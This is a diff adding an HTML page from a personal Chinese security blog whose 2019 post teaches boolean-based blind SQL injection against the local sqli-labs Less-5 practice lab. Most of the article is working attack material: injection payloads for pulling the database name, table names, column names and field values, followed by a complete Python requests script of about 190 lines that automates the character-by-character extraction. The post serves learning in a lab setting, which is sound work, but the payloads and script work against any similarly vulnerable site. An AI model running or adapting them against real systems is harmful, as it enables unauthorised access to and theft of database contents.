@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <meta name="description" content="osword&#39;s blog">
+  <meta name="keyword" content="hexo-theme, vuejs">
+  
+    <link rel="shortcut icon" href="/css/images/logo.png">
+  
+  <title>
+    
+      sql盲注(附python脚本) | osword&#39;s blog
+    
+  </title>
+  <link href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.css" rel="stylesheet">
+  <link href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/tomorrow.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/css/plugins/gitment.css">
+
+  
+  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/geopattern/1.2.3/js/geopattern.min.js"></script>
+  <script src="//cdnjs.cloudflare.com/ajax/libs/nprogress/0.2.0/nprogress.min.js"></script>
+  
+  
+    
+<script src="/js/gitment.js"></script>
+
+  
+  
+  
+    <!-- MathJax support START -->
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <!-- MathJax support END -->
+  
+
+
+  
+<meta name="generator" content="Hexo 4.2.1"></head>
+<div class="wechat-share">
+  <img src="/css/images/logo.png" />
+</div>
+
+  <body>
+    <header class="header fixed-header">
+  <div class="header-container">
+    <a class="home-link" href="/">
+      <div class="logo"></div>
+      <span>osword's blog</span>
+    </a>
+    <ul class="right-list">
+      
+        <li class="list-item">
+          
+            <a href="/" class="item-link">Home</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/links/" class="item-link">Links</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/archives/" class="item-link">Archives</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/project/" class="item-link">Projects</a>
+          
+        </li>
+      
+        <li class="list-item">
+          
+            <a href="/about/" class="item-link">About</a>
+          
+        </li>
+      
+    </ul>
+    <div class="menu">
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+      <span class="icon-bar"></span>
+    </div>
+    <div class="menu-mask">
+      <ul class="menu-list">
+        
+          <li class="menu-item">
+            
+              <a href="/" class="menu-link">Home</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/links/" class="menu-link">Links</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/archives/" class="menu-link">Archives</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/project/" class="menu-link">Projects</a>
+            
+          </li>
+        
+          <li class="menu-item">
+            
+              <a href="/about/" class="menu-link">About</a>
+            
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</header>
+
+    <div id="article-banner">
+  <h2>sql盲注(附python脚本)</h2>
+  <p class="post-date">2019-02-20 - 
+<span id="busuanzi_container_page_pv" style="color: #fff; margin-left: 0px">阅读量<span id="busuanzi_value_page_pv"></span>次
+        </span></p>
+<div class="arrow-down">
+    <a href="javascript:;"></a>
+  </div>
+</div>
+<main class="app-body flex-box">
+  <!-- Article START -->
+  <article class="post-article">
+    <section class="markdown-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>写在前面，学sql盲注最麻烦不过对脚本编写，会努力学习算法，代码效率还是太低。</p>
+<p>select user(); 取得当前登陆MYsql数据库的账户名字<br>select top 1:SELECT TOP 子句规定要返回的记录的数目.<br>1。基于布尔的sql注入<br><img src="./1.png" alt=""><br>上图是可以通过布尔注入确定出登陆账户名</p>
+<h1 id="布尔盲注知识点（Python脚本代码）"><a href="#布尔盲注知识点（Python脚本代码）" class="headerlink" title="布尔盲注知识点（Python脚本代码）"></a>布尔盲注知识点（Python脚本代码）</h1><blockquote>
+<blockquote>
+<p>布尔注入通过网页的正常反馈信息确定值.<br>以下是关于几个注入用到函数</p>
+</blockquote>
+</blockquote>
+<ol>
+<li>length((select x from x where x ))</li>
+<li>ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101 –+<br>__(substr(a,b,c) 从b位置开始，截取字符串a的c长度.</li>
+<li>ascii(substr((select database(),1,1)))=98</li>
+<li>regexp正则注入（没用到，技术不够，有机会在补）</li>
+</ol>
+<p>布尔盲注：<br>1.猜解数据库长度&gt;&gt;猜解数据库名&gt;&gt;猜解表数&gt;&gt;猜解表长度&gt;&gt;猜解表名&gt;&gt;猜解需要表列个数&gt;&gt;猜解admin表各列的长度&gt;&gt;猜解admin各列的列名&gt;&gt;猜解admin每个列字段数&gt;&gt;猜解每个字段长度&gt;&gt;爆破每个字段值<br>url=”<a href="http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;&quot;" target="_blank" rel="noopener">http://127.0.0.1/sqlilabs/Less-5/?id=1&#39;&quot;</a></p>
+<h1 id="猜解数据库长度"><a href="#猜解数据库长度" class="headerlink" title="猜解数据库长度"></a>猜解数据库长度</h1><p>%d=(select length(database()))<br><img src="./%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%BA%93%E9%95%BF%E5%BA%A6.png" alt=""> </p>
+<h1 id="猜解数据库名字"><a href="#猜解数据库名字" class="headerlink" title="猜解数据库名字"></a>猜解数据库名字</h1><p>%d=ascii(substr(database(),%d,1))<br><img src="./%E7%8C%9C%E8%A7%A3%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E5%AD%97.png" alt=""> </p>
+<h1 id="猜解表数"><a href="#猜解表数" class="headerlink" title="猜解表数"></a>猜解表数</h1><p>%d=(select count(table_name) from information_schema.tables where table_schema=database())–+<br><img src="./%E7%8C%9C%E8%A7%A3%E8%A1%A8%E6%95%B0.png" alt=""> </p>
+<h1 id="猜解表名长度"><a href="#猜解表名长度" class="headerlink" title="猜解表名长度"></a>猜解表名长度</h1><p>%d=length((select table_name from information_schema.tables where table_schema=database() limit %d,1 ))–+’<br><img src="./%E7%8C%9C%E8%A7%A3%E8%A1%A8%E5%90%8D%E9%95%BF%E5%BA%A6.png" alt=""> </p>
+<h1 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h1><p>%d=ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1  ),%d,1))–+’<br><img src="./%E7%8C%9C%E8%A7%A3%E8%A1%A8%E5%90%8D.png" alt=""><br><img src="./%E7%8C%9C%E8%A7%A3%E8%A1%A8%E5%90%8D1.png" alt=""> </p>
+<h1 id="猜解需要表列个数"><a href="#猜解需要表列个数" class="headerlink" title="猜解需要表列个数"></a>猜解需要表列个数</h1><p>%d=(select count(column_name) from information_schema.columns where table_name = “%s”)–+<br><img src="./%E7%8C%9C%E8%A7%A3%E9%9C%80%E8%A6%81%E8%A1%A8%E5%88%97%E4%B8%AA%E6%95%B0.png" alt=""> </p>
+<h1 id="猜解admin表各列的长度"><a href="#猜解admin表各列的长度" class="headerlink" title="猜解admin表各列的长度"></a>猜解admin表各列的长度</h1><p> %d=length((select column_name from information_schema.columns where table_name=”users” limit %d,1 ))–+<br>![]./猜解admin表各列的长度.png) </p>
+<h1 id="猜解admin各列的列名"><a href="#猜解admin各列的列名" class="headerlink" title="猜解admin各列的列名"></a>猜解admin各列的列名</h1><p>%d=ascii(substr((select column_name from information_schema.columns where table_name=”users” limit %d,1),%d,1))–+<br><img src="./%E7%8C%9C%E8%A7%A3admin%E5%90%84%E5%88%97%E7%9A%84%E5%88%97%E5%90%8D.png" alt=""> </p>
+<h1 id="计算每个列的字段数select-count-id-from-users"><a href="#计算每个列的字段数select-count-id-from-users" class="headerlink" title="计算每个列的字段数select count(id) from users;"></a>计算每个列的字段数select count(id) from users;</h1><h1 id="猜解每个字段长度-select-length-select-id-from-users-limit-0-1"><a href="#猜解每个字段长度-select-length-select-id-from-users-limit-0-1" class="headerlink" title="猜解每个字段长度 select length((select id from users limit 0,1))"></a>猜解每个字段长度 select length((select id from users limit 0,1))</h1><h1 id="猜解每个字段值select-ascii-substr-select-id-from-users-limit-0-1-1-1"><a href="#猜解每个字段值select-ascii-substr-select-id-from-users-limit-0-1-1-1" class="headerlink" title="猜解每个字段值select ascii(substr((select id from users limit 0,1),1,1))"></a>猜解每个字段值select ascii(substr((select id from users limit 0,1),1,1))</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">db_length&#x3D;1</span><br><span class="line">db_url&#x3D;&#39;&#39;</span><br><span class="line">db_name&#x3D;&#39;&#39;</span><br><span class="line">db_ascii&#x3D;1</span><br><span class="line">db_place&#x3D;1</span><br><span class="line">tb_sum&#x3D;1</span><br><span class="line">tb_url&#x3D;&#39;&#39;</span><br><span class="line">tb_num1&#x3D;0</span><br><span class="line">tb_lname&#x3D;0</span><br><span class="line">tb_array&#x3D;[]</span><br><span class="line">tb_nameasc&#x3D;0</span><br><span class="line">tb_namenum&#x3D;0</span><br><span class="line">tb_namepla&#x3D;0</span><br><span class="line">tb_nameurl&#x3D;&#39;&#39;</span><br><span class="line">tb_name&#x3D;&#39;&#39;</span><br><span class="line">tb_arrayname&#x3D;[]</span><br><span class="line">#猜解数据库名长度</span><br><span class="line">print(&#39;开始猜解数据库名长度&#39;)</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sqlilabs&#x2F;Less-5&#x2F;?id&#x3D;1&#39;&quot;   </span><br><span class="line">for db_length in range(1,100):</span><br><span class="line">    db_url&#x3D;url+&#39;and %d&#x3D;(select length(database()))--+&#39;%(db_length)</span><br><span class="line">    r&#x3D;requests.get(db_url)</span><br><span class="line">    if &#39;You are in...........&#39; in r.text:</span><br><span class="line">        print(&#39;[!] &#39;+db_url)</span><br><span class="line">        print(&#39;猜解结束&#39;)</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        print(&#39;[x] &#39;+db_url)</span><br><span class="line">print(&#39;数据库名长度：%d&#39;%(db_length))        </span><br><span class="line">#猜解数据库名</span><br><span class="line">#猜解数据库名ascii(substr(database(),x,1)</span><br><span class="line">print(&#39;----------------------------------------------&#39;)</span><br><span class="line">print(&#39;\n\n正在猜解数据库名.......&#39;)</span><br><span class="line">db_urlname&#x3D;&#39;and %d&#x3D;ascii(substr(database(),%d,1))--+&#39;%(db_ascii,db_place)</span><br><span class="line">for db_place in range(1,db_length+1):</span><br><span class="line">    for db_ascii in range(0,127):</span><br><span class="line">        db_urlname&#x3D;url+&#39;and %d&#x3D;ascii(substr(database(),%d,1))--+&#39;%(db_ascii,db_place)</span><br><span class="line">        r&#x3D;requests.get(db_urlname)</span><br><span class="line">        if &#39;You are in...........&#39; in r.text:</span><br><span class="line">            db_name&#x3D;db_name+chr(db_ascii)</span><br><span class="line">            print(&#39;[!] &#39;+db_name)</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line">print(&#39;end.......&#39;)</span><br><span class="line">print(&#39;数据库名：&#39;+db_name)</span><br><span class="line">#猜解表数 select count(table_name)  from information_schema.tables where table_schema&#x3D;&#39;security&#39;;</span><br><span class="line">print(&#39;\n\n开始猜解表数.......&#39;)</span><br><span class="line">for tb_sum in range(1,10):</span><br><span class="line">    tb_url&#x3D;url+&#39;and %d&#x3D;(select count(table_name)  from information_schema.tables where table_schema&#x3D;database())--+&#39;%(tb_sum)</span><br><span class="line">    r&#x3D;requests.get(tb_url)</span><br><span class="line">    if &#39;You are in...........&#39; in r.text:</span><br><span class="line">        print(&#39;[!] &#39;+tb_url)</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        print(&#39;[x] &#39;+tb_url)</span><br><span class="line">print(&#39;猜解表数结束&#39;)</span><br><span class="line">print(&#39;表数：%d&#39;%(tb_sum))</span><br><span class="line">#猜解表名长度select length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1 ));</span><br><span class="line">#+-----------------------------------------------------------------------------------------------------+</span><br><span class="line">#| length((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1 )) |</span><br><span class="line">#+-----------------------------------------------------------------------------------------------------+</span><br><span class="line">#|                                                                                                   6 |</span><br><span class="line"># +-----------------------------------------------------------------------------------------------------+</span><br><span class="line"># 1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"># mysql&gt; show tables;</span><br><span class="line"># +--------------------+</span><br><span class="line"># | Tables_in_security |</span><br><span class="line"># +--------------------+</span><br><span class="line"># | emails             |</span><br><span class="line"># | referers           |</span><br><span class="line"># | uagents            |</span><br><span class="line"># | users              |</span><br><span class="line"># +--------------------+</span><br><span class="line"># 4 rows in set (0.00 sec)</span><br><span class="line">print(&#39;\n\n开始猜解每一个表名长度&#39;)</span><br><span class="line">for tb_num1 in range(0,tb_sum+1):</span><br><span class="line">    for tb_lname in range(1,20):</span><br><span class="line">        tb_lengthurl&#x3D;url+&#39;and %d&#x3D;length((select table_name from information_schema.tables where table_schema&#x3D;database() limit %d,1 ))--+&#39;%(tb_lname,tb_num1)</span><br><span class="line">        r&#x3D;requests.get(tb_lengthurl)</span><br><span class="line">        if &#39;You are in...........&#39; in r.text:</span><br><span class="line">            tb_array.append(tb_lname)</span><br><span class="line">            print(&#39;[!] %d&#39;%(tb_lname)+&#39;&gt;&gt;%s&#39;%(tb_lengthurl))</span><br><span class="line">            tb_lname&#x3D;0</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line">for i in range(0,len(tb_array)):</span><br><span class="line">    print(&#39;猜解结束第%d个表名长度分别为：%d&#39;%(i+1,tb_array[i]))</span><br><span class="line">print(&#39;猜解各个表名长度结束&#39;)</span><br><span class="line">print(&#39;\n\n&#39;)</span><br><span class="line">#猜解表名 select substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1  ),1,1);</span><br><span class="line">print(&#39;猜解各个表名开始...........&#39;)</span><br><span class="line">for tb_namenum  in range(0,tb_sum):</span><br><span class="line">    for tb_namepla in range(1,tb_array[tb_namenum]+1):</span><br><span class="line">        for tb_nameasc in range(0,128):</span><br><span class="line">            tb_nameurl&#x3D;url+&#39;and %d&#x3D;ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit %d,1  ),%d,1))--+&#39;%(tb_nameasc,tb_namenum,tb_namepla)</span><br><span class="line">            r&#x3D;requests.get(tb_nameurl)</span><br><span class="line">            if &#39;You are in...........&#39; in r.text:</span><br><span class="line">                tb_name&#x3D;tb_name+chr(tb_nameasc)</span><br><span class="line">                print(&#39;[!] &#39;+tb_name)</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                continue</span><br><span class="line">    tb_arrayname.append(tb_name)</span><br><span class="line">    tb_name&#x3D;&#39;&#39;</span><br><span class="line">    print(&#39;\n&#39;)</span><br><span class="line">for i in range(0,len(tb_arrayname)):</span><br><span class="line">    print(&#39;猜解结束第%d个表名为：%s&#39;%(i+1,tb_arrayname[i]))</span><br><span class="line">#猜解列个数</span><br><span class="line">cl_osum&#x3D;[]</span><br><span class="line">print(&#39;\n\n开始猜解列个数...........&#39;)</span><br><span class="line">for i in range(tb_sum):</span><br><span class="line">    for j in range(1,10):</span><br><span class="line">        cl_sumurl &#x3D; url+&#39;and %d&#x3D;(select count(column_name) from information_schema.columns where table_name &#x3D; &quot;%s&quot;)--+&#39;%(j,tb_arrayname[i])</span><br><span class="line">        r&#x3D;requests.get(cl_sumurl)</span><br><span class="line">        if &#39;You are in...........&#39; in r.text:</span><br><span class="line">            cl_osum.append(j)</span><br><span class="line">            print(&#39;[!] &#39;+cl_sumurl+&#39;&gt;&gt;匹配成功&#39;)</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line">for i in range(0,tb_sum):</span><br><span class="line">    print(tb_arrayname[i]+&#39;列数：%d&#39;%(cl_osum[i]))</span><br><span class="line">print(&#39;猜解列个数结束&#39;)</span><br><span class="line">#猜解每个表的列数</span><br><span class="line">##mysql&gt; select count(column_name) from information_schema.columns where table_name &#x3D; &#39;users&#39; limit 0,1;</span><br><span class="line">#+--------------------+</span><br><span class="line">#| count(column_name) |</span><br><span class="line">#+--------------------+</span><br><span class="line">#|                  3 |</span><br><span class="line">#+--------------------+</span><br><span class="line">#1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line"># for i in range(4):</span><br><span class="line">#     for j in range(1,10):</span><br><span class="line">#         cl_sumurl &#x3D; url+&#39;and %d&#x3D;(select count(column_name) from information_schema.columns where table_name &#x3D; &quot;%s&quot;)--+&#39;%(j,tb_arrayname[i])</span><br><span class="line">#         r&#x3D;requests.get(cl_sumurl)</span><br><span class="line">#         if &#39;You are in...........&#39; in r.text:</span><br><span class="line">#             print(tb_arrayname[i]+&#39;的列数为：%d&#39;%(j))</span><br><span class="line">#             break</span><br><span class="line">#         else:</span><br><span class="line">#             continue</span><br><span class="line">cl_lensum&#x3D;[]</span><br><span class="line">cl_lennam&#x3D;[]</span><br><span class="line">#计算admin列长度即可</span><br><span class="line">for j in range(0,4): </span><br><span class="line">    for l in range(1,20):</span><br><span class="line">        cl_len&#x3D;url+&#39;and %d&#x3D;length((select column_name from information_schema.columns where table_name&#x3D;&quot;users&quot; limit %d,1 ))--+&#39;%(l,j)</span><br><span class="line">        r&#x3D; requests.get(cl_len)</span><br><span class="line">        if &#39;You are in...........&#39; in r.text:</span><br><span class="line">            cl_lennam.append(l)</span><br><span class="line">            print(&#39;users&gt;&gt;第%d列长度为：%d&#39;%(j+1,l))</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            continue</span><br><span class="line">print(&#39;\n&#39;)</span><br><span class="line">print(cl_lennam)</span><br><span class="line">#猜解列名</span><br><span class="line">#select ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;emails&#39; limit 0,1),1,1));</span><br><span class="line">#+-------------------------------------------------------------------------------------------------------------+</span><br><span class="line">#| ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&#39;emails&#39; limit 0,1),1,1)) |</span><br><span class="line">#+-------------------------------------------------------------------------------------------------------------+</span><br><span class="line">#|                                                                                                         105 |</span><br><span class="line">#+-------------------------------------------------------------------------------------------------------------+</span><br><span class="line">#1 row in set (0.01 sec)</span><br><span class="line">#想知道users表的3列的各个列名</span><br><span class="line">cl_name&#x3D;&#39;&#39;</span><br><span class="line">cl_namearr&#x3D;[]</span><br><span class="line">for j in range(0,3):</span><br><span class="line">    for i in range(cl_lennam[j]+1):</span><br><span class="line">        for cl_ascii in range(0,128):</span><br><span class="line">            cl_admin&#x3D;url+&#39;and %d&#x3D;ascii(substr((select column_name from information_schema.columns where table_name&#x3D;&quot;users&quot; limit %d,1),%d,1))--+&#39;%(cl_ascii,j,i)</span><br><span class="line">            r&#x3D; requests.get(cl_admin)</span><br><span class="line">            if &#39;You are in&#39; in r.text:</span><br><span class="line">                cl_name&#x3D;cl_name+chr(cl_ascii)</span><br><span class="line">                print(&#39;[~]&#39;+cl_name)</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                continue</span><br><span class="line">    cl_name&#x3D;cl_name.strip(&#39;\x00&#39;)</span><br><span class="line">    cl_namearr.append(cl_name)</span><br><span class="line">    cl_name&#x3D;&#39;&#39;</span><br><span class="line">    print(&#39;\n&#39;)</span><br><span class="line">print(cl_namearr)</span><br></pre></td></tr></table></figure>
+
+
+
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#SQL注入" >
+    <span class="tag-code">SQL注入</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/01/02/uploadlabs-%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87/">
+        <span class="nav-arrow">← </span>
+        
+          uploadlabs_上传绕过
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/02/20/DVWA%E4%B9%8BAnti-CSRF%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8/">
+        
+          DVWA之Anti CSRF分析利用(python3+Brute Password)
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#前言"><span class="toc-nav-text">前言</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#布尔盲注知识点（Python脚本代码）"><span class="toc-nav-text">布尔盲注知识点（Python脚本代码）</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#猜解数据库长度"><span class="toc-nav-text">猜解数据库长度</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#猜解数据库名字"><span class="toc-nav-text">猜解数据库名字</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#猜解表数"><span class="toc-nav-text">猜解表数</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#猜解表名长度"><span class="toc-nav-text">猜解表名长度</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#猜解表名"><span class="toc-nav-text">猜解表名</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#猜解需要表列个数"><span class="toc-nav-text">猜解需要表列个数</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#猜解admin表各列的长度"><span class="toc-nav-text">猜解admin表各列的长度</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#猜解admin各列的列名"><span class="toc-nav-text">猜解admin各列的列名</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#计算每个列的字段数select-count-id-from-users"><span class="toc-nav-text">计算每个列的字段数select count(id) from users;</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#猜解每个字段长度-select-length-select-id-from-users-limit-0-1"><span class="toc-nav-text">猜解每个字段长度 select length((select id from users limit 0,1))</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#猜解每个字段值select-ascii-substr-select-id-from-users-limit-0-1-1-1"><span class="toc-nav-text">猜解每个字段值select ascii(substr((select id from users limit 0,1),1,1))</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/02/20/sql盲注-附python脚本/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
